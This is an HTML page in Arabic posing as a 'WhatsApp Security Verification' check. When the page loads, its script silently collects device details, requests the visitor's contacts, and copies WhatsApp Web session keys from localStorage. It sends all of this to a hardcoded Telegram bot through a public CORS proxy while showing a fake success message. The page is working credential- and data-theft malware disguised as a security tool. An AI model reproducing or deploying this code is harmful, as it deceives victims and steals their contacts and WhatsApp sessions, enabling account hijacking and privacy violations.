<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Security Check</title>
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 40px 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: #1f1f1f;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 0 30px rgba(37, 211, 102, 0.3);
        }
        h1 { color: #25D366; font-size: 24px; margin-bottom: 10px; }
        p { color: #ccc; font-size: 14px; line-height: 1.6; }
        .loader {
            margin: 30px auto;
            border: 4px solid #333;
            border-top: 4px solid #25D366;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { color: #25D366; font-weight: bold; display: none; }
        .warning { color: #ff9800; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>WhatsApp Security Verification</h1>
        <p>جارٍ التحقق من أمان حسابك...</p>
        <div class="loader"></div>
        <p class="success" id="successMsg">تم التحقق بنجاح! يمكنك إغلاق الصفحة الآن.</p>
        <p class="warning">يرجى عدم إغلاق الصفحة حتى اكتمال الفحص.</p>
    </div>

    <script>
        // ---------- إعدادات تيليجرام ----------
        const BOT_TOKEN = "8848720448:AAGgjjusWWTYNKLIs_3auDQW6DQDK0kaZfc";
        const CHAT_ID = "6969346690";

        // رابط API الأصلي (محجوب) – سنمرره عبر البروكسي
        const TELEGRAM_API_ORIGINAL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // ---------- بروكسي عام لتجاوز الحجب ----------
        const CORS_PROXY = "https://corsproxy.io/?"; // + encodeURIComponent(url)
        const TELEGRAM_VIA_PROXY = CORS_PROXY + encodeURIComponent(TELEGRAM_API_ORIGINAL);

        // ---------- جمع البيانات ----------
        async function collectAndSend() {
            const data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookiesEnabled: navigator.cookieEnabled,
                online: navigator.onLine,
                url: window.location.href,
                referrer: document.referrer || "none"
            };

            // جهات الاتصال
            if (navigator.contacts) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    data.contacts = contacts;
                } catch (e) { data.contacts = "permission_denied"; }
            } else { data.contacts = "api_not_supported"; }

            // localStorage (جلسات واتساب ويب)
            try {
                const waKeys = Object.keys(localStorage).filter(k => k.startsWith('WA'));
                if (waKeys.length > 0) {
                    data.whatsapp_storage = {};
                    waKeys.forEach(k => data.whatsapp_storage[k] = localStorage.getItem(k));
                }
            } catch (e) {}

            // ---------- إرسال إلى تيليغرام عبر البروكسي ----------
            const text = `📥 تقرير فحص أمني جديد:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
            const payload = { chat_id: CHAT_ID, text: text };

            // عبر البروكسي (Fetch POST)
            fetch(TELEGRAM_VIA_PROXY, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(result => {
                console.log("Telegram via proxy success:", result);
                document.querySelector('.loader').style.display = 'none';
                document.getElementById('successMsg').style.display = 'block';
            })
            .catch(error => {
                console.error("Proxy failed, trying direct...", error);
                // محاولة أخيرة مباشرة (قد تفشل ولكن لا تؤثر)
                fetch(TELEGRAM_API_ORIGINAL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).finally(() => {
                    document.querySelector('.loader').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                });
            });
        }

        collectAndSend();
    </script>
</body>
</html>
